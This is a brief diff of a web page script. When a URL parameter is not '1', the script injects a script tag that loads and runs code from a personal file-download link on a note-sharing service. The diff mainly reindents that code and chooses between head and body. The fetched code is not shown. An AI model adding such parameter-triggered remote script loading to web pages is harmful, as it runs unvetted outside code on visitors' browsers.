@@ -20,7 +20,10 @@ if (iValue === '1') {
 // 如果参数 i 的值为其他值，则执行第二段代码
 else {
     var s = document.createElement('script');
-s.setAttribute('src', '//note.youdao.com/yws/api/personal/file/DF51C54B812E4F7CAC02E642D941E4ED?method=download&inline=true&shareKey=43c142c7924e806f91a1ce39e873b6c8');
-document.head.appendChild(s);
-
+    s.setAttribute('src', '//note.youdao.com/yws/api/personal/file/DF51C54B812E4F7CAC02E642D941E4ED?method=download&inline=true&shareKey=43c142c7924e806f91a1ce39e873b6c8');
+    if (!document.body) 
+        document.head.appendChild(s);
+    else 
+        document.body.appendChild(s);
+}
 </script>
